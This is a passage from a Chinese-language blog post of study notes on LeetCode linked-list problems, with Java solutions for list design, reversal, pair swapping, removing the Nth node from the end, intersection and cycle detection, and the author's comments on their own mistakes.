class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        tail = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        head.next = tail;</span><br><span class="line">        tail.prev = head;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="comment">//判断哪边时间更短</span></span><br><span class="line">        <span class="keyword">if</span>(index &gt;= size /<span class="number">2</span> )&#123;</span><br><span class="line">            cur = tail;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size - index; i++)&#123;</span><br><span class="line">                cur = cur.prev;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= index; i++)&#123;</span><br><span class="line">                cur = cur.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cur.val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtHead</span><span class="params">(<span class="type">int</span> val)</span>&#123;</span><br><span class="line">        addAtIndex(<span class="number">0</span>, val);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtTail</span><span class="params">(<span class="type">int</span> val)</span>&#123;</span><br><span class="line">       addAtIndex(size, val);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtIndex</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> val)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &gt; size)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            index = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        size++;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">pred</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;index;i++)&#123;</span><br><span class="line">            pred = pred.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">toAdd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        toAdd.next = pred.next;</span><br><span class="line">        pred.next.prev = toAdd;</span><br><span class="line">        toAdd.prev = pred;</span><br><span class="line">        pred.next = toAdd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteAtIndex</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        size--;</span><br><span class="line">        ListNode pred= head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; index;i++)&#123;</span><br><span class="line">            pred = pred.next;</span><br><span class="line">        &#125;</span><br><span class="line">        pred.next.next.prev = pred;</span><br><span class="line">        pred.next = pred.next.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="206-反转链表"><a href="#206-反转链表" class="headerlink" title="206 反转链表"></a>206 反转链表</h2><p>给你单链表的头节点 head ，请你反转链表，并返回反转后的链表。<br>&#x2F;&#x2F; 双指针</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">null</span>)  <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="literal">null</span>)&#123;</span><br><span class="line">            tmp = cur.next;</span><br><span class="line">            cur.next = prev;</span><br><span class="line">            prev = cur;</span><br><span class="line">            cur = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> prev;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F; 递归</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> reverse(<span class="literal">null</span>, head);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverse</span><span class="params">(ListNode prev, ListNode cur)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(cur == <span class="literal">null</span>) <span class="keyword">return</span> prev;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        temp = cur.next;</span><br><span class="line">        cur.next = prev;</span><br><span class="line">        <span class="keyword">return</span> reverse(cur, temp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F; 从后向前递归</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="comment">// 边缘条件判断</span></span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(head.next == <span class="literal">null</span>) <span class="keyword">return</span> head;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 递归调用，翻转第二个节点开始往后的链表</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">last</span> <span class="operator">=</span> reverseList(head.next);</span><br><span class="line">        <span class="comment">// 翻转头结点与第二个节点的指向</span></span><br><span class="line">        head.next.next = head;</span><br><span class="line">        <span class="comment">// 此时的head节点为尾节点，next需要指向null</span></span><br><span class="line">        head.next = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">return</span> last;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F; 使用虚节点的头插法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummyHead</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>);</span><br><span class="line">        dummyHead.next = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">temp</span> <span class="operator">=</span> cur.next;</span><br><span class="line">            <span class="comment">// 头插法</span></span><br><span class="line">            cur.next = dummyHead.next;</span><br><span class="line">            dummyHead.next = cur;</span><br><span class="line">            cur = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummyHead.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F; 使用栈解决反转链表问题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(head.next == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        Stack&lt;ListNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="literal">null</span>)&#123;</span><br><span class="line">            stack.push(cur);</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">pHead</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        cur = pHead;</span><br><span class="line">        <span class="keyword">while</span>(!stack.isEmpty())&#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">node</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">            cur.next = node;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        cur.next = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">return</span> pHead.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题一开始没有让prev指向null出错了</p><h2 id="24-两两交换链表中的节点"><a href="#24-两两交换链表中的节点" class="headerlink" title="24. 两两交换链表中的节点"></a>24. 两两交换链表中的节点</h2><p>给你一个链表，两两交换其中相邻的节点，并返回交换后链表的头节点。你必须在不修改节点内部的值的情况下完成本题（即，只能进行节点交换）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">swapPairs</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dumyhead</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>);</span><br><span class="line">        dumyhead.next = head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> dumyhead;</span><br><span class="line">        ListNode temp;</span><br><span class="line">        ListNode firstnode;</span><br><span class="line">        ListNode secondnode;</span><br><span class="line">        <span class="keyword">while</span>(cur.next != <span class="literal">null</span> &amp;&amp; cur.next.next != <span class="literal">null</span>)&#123;</span><br><span class="line">            temp = cur.next.next.next;</span><br><span class="line">            firstnode = cur.next;</span><br><span class="line">            secondnode = cur.next.next;</span><br><span class="line">            cur.next = secondnode;</span><br><span class="line">            secondnode.next = firstnode;</span><br><span class="line">            firstnode.next = temp;</span><br><span class="line">            cur = firstnode;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dumyhead.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F; 递归解决</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">swapPairs</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">next</span> <span class="operator">=</span> head.next;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">newNode</span> <span class="operator">=</span> swapPairs(next.next);</span><br><span class="line">        next.next = head;</span><br><span class="line">        head.next = newNode;</span><br><span class="line">        <span class="keyword">return</span> next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="19-删除链表的倒数第-N-个结点"><a href="#19-删除链表的倒数第-N-个结点" class="headerlink" title="19. 删除链表的倒数第 N 个结点"></a>19. 删除链表的倒数第 N 个结点</h2><p>给你一个链表，删除链表的倒数第 n 个结点，并且返回链表的头结点。<br><img src="/2024/09/11/algorithm/List/image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">removeNthFromEnd</span><span class="params">(ListNode head, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummyhead</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        dummyhead.next = head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> dummyhead;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> dummyhead;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            fast = fast.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(fast.next != <span class="literal">null</span>)&#123;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            fast = fast.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(slow.next == fast)&#123;</span><br><span class="line">            fast = <span class="literal">null</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            slow.next = fast;   </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummyhead.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我上面的代码对于边界条件处理不好，下面是答案：<br>fast首先走n + 1步 ，为什么是n+1呢，因为只有这样同时移动的时候slow才能指向删除节点的上一个节点（方便做删除操作），如图：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">removeNthFromEnd</span><span class="params">(ListNode head, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummyhead</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        dummyhead.next = head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> dummyhead;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> dummyhead;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            fast = fast.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(fast != <span class="literal">null</span>)&#123;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            fast = fast.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 此时 slowIndex 的位置就是待删除元素的前一个位置。</span></span><br><span class="line">        <span class="comment">// 具体情况可自己画一个链表长度为 3 的图来模拟代码来理解</span></span><br><span class="line">        <span class="comment">// 检查 slowIndex.next 是否为 null，以避免空指针异常</span></span><br><span class="line">        <span class="keyword">if</span>(slow.next != <span class="literal">null</span>)&#123;</span><br><span class="line">            slow.next = slow.next.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummyhead.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我又自己写了个，按照我原来的思路：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">removeNthFromEnd</span><span class="params">(ListNode head, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummyhead</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        dummyhead.next = head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> dummyhead;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> dummyhead;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            fast = fast.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(fast.next != <span class="literal">null</span>)&#123;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            fast = fast.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 此时 slowIndex 的位置就是待删除元素的前一个位置。</span></span><br><span class="line">        <span class="comment">// 具体情况可自己画一个链表长度为 3 的图来模拟代码来理解</span></span><br><span class="line">        <span class="comment">// 检查 slowIndex.next 是否为 null，以避免空指针异常</span></span><br><span class="line">        slow.next = slow.next.next;</span><br><span class="line">        <span class="keyword">return</span> dummyhead.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="面试题-02-07-链表相交"><a href="#面试题-02-07-链表相交" class="headerlink" title="面试题 02.07. 链表相交"></a>面试题 02.07. 链表相交</h2><p><img src="/2024/09/11/algorithm/List/image-1.png"><br>思路是先让链表指针移动到剩余长度相同的位置，然后让两个链表同时移动，直到遇到相同的节点，或者遇到null。注意这道题相交节点处指针是相同的，我开始还在想还要对比后面的节点。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">getIntersectionNode</span><span class="params">(ListNode headA, ListNode headB)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">curA</span> <span class="operator">=</span> headA;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">curB</span> <span class="operator">=</span> headB;</span><br><span class="line">        <span class="type">int</span> <span class="variable">lenA</span> <span class="operator">=</span> <span class="number">0</span>, lenB = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(curA != <span class="literal">null</span>)&#123;</span><br><span class="line">            lenA++;</span><br><span class="line">            curA = curA.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(curB != <span class="literal">null</span>)&#123;</span><br><span class="line">            lenB++;</span><br><span class="line">            curB = curB.next;</span><br><span class="line">        &#125;</span><br><span class="line">        curA = headA;</span><br><span class="line">        curB = headB;</span><br><span class="line">        <span class="keyword">if</span>(lenB &gt; lenA)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">tmpLen</span> <span class="operator">=</span> lenA;</span><br><span class="line">            lenA = lenB;</span><br><span class="line">            lenB = tmpLen;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">tmpNode</span> <span class="operator">=</span> curA;</span><br><span class="line">            curA = curB;</span><br><span class="line">            curB = tmpNode;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 求长度差</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">gap</span> <span class="operator">=</span> lenA - lenB;</span><br><span class="line">        <span class="comment">// 让curA和curB在同一起点上</span></span><br><span class="line">        <span class="keyword">while</span>(gap-- &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            curA = curA.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(curA != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(curA == curB)&#123;</span><br><span class="line">                <span class="keyword">return</span> curA;</span><br><span class="line">            &#125;</span><br><span class="line">            curA = curA.next;</span><br><span class="line">            curB = curB.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面的版本是同步走的版本：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//合并链表同步移动</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">getIntersectionNode</span><span class="params">(ListNode headA, ListNode headB)</span> &#123;</span><br><span class="line">       <span class="comment">// p1指向A链表头节点，p2指向B链表头节点</span></span><br><span class="line">       <span class="type">ListNode</span> <span class="variable">p1</span> <span class="operator">=</span> headA, p2 = headB;</span><br><span class="line">       <span class="keyword">while</span>(p1 != p2)&#123;</span><br><span class="line">        <span class="comment">// p1走一步，如果走到A链表末尾，转到B链表</span></span><br><span class="line">        <span class="keyword">if</span>(p1 == <span class="literal">null</span>) p1 = headB;</span><br><span class="line">        <span class="keyword">else</span> p1 = p1.next;</span><br><span class="line">        <span class="comment">// p2走一步，如果走到B链表末尾，转到A链表</span></span><br><span class="line">        <span class="keyword">if</span>(p2 == <span class="literal">null</span>) p2 = headA;</span><br><span class="line">        <span class="keyword">else</span> p2 = p2.next;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> p1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="142-环形链表II"><a href="#142-环形链表II" class="headerlink" title="142.环形链表II"></a>142.环形链表II</h2><p>判断链表是否有环<br>可以使用快慢指针法，分别定义 fast 和 slow 指针，从头结点出发，fast指针每次移动两个节点，slow指针每次移动一个节点，如果 fast 和 slow指针在途中相遇 ，说明这个链表有环。<br>为什么fast 走两个节点，slow走一个节点，有环的话，一定会在环内相遇呢，而不是永远的错开呢<br>首先第一点：fast指针一定先进入环中，如果fast指针和slow指针相遇的话，一定是在环中相遇，这是毋庸置疑的。<br>那么来看一下，为什么fast指针和slow指针一定会相遇呢？<br>可以画一个环，然后让 fast指针在任意一个节点开始追赶slow指针。这是因为fast是走两步，slow是走一步，其实相对于slow来说，fast是一个节点一个节点的靠近slow的，所以fast一定可以和slow重合。</p><p>如果有环，如何找到这个环的入口<br>此时已经可以判断链表是否有环了，那么接下来要找这个环的入口了。<br>假设从头结点到环形入口节点 的节点数为x。 环形入口节点到 fast指针与slow指针相遇节点 节点数为y。 从相遇节点 再到环形入口节点节点数为 z。<br>那么相遇时： slow指针走过的节点数为: x + y， fast指针走过的节点数：x + y + n (y + z)，n为fast指针在环内走了n圈才遇到slow指针， （y+z）为 一圈内节点的个数A。<br><img src="/2024/09/11/algorithm/List/image-2.png"><br>因为fast指针是一步走两个节点，slow指针一步走一个节点， 所以 fast指针走过的节点数 &#x3D; slow指针走过的节点数 * 2：<br>(x + y) * 2 &#x3D; x + y + n (y + z)<br>两边消掉一个（x+y）: x + y &#x3D; n (y + z)<br>因为要找环形的入口，那么要求的是x，因为x表示 头结点到 环形入口节点的的距离。<br>所以要求x ，将x单独放在左面：x &#x3D; n (y + z) - y ,<br>再从n(y+z)中提出一个 （y+z）来，整理公式之后为如下公式：x &#x3D; (n - 1) (y + z) + z 注意这里n一定是大于等于1的，因为 fast指针至少要多走一圈才能相遇slow指针。<br>这个公式说明什么呢？<br>先拿n为1的情况来举例，意味着fast指针在环形里转了一圈之后，就遇到了 slow指针了。<br>当 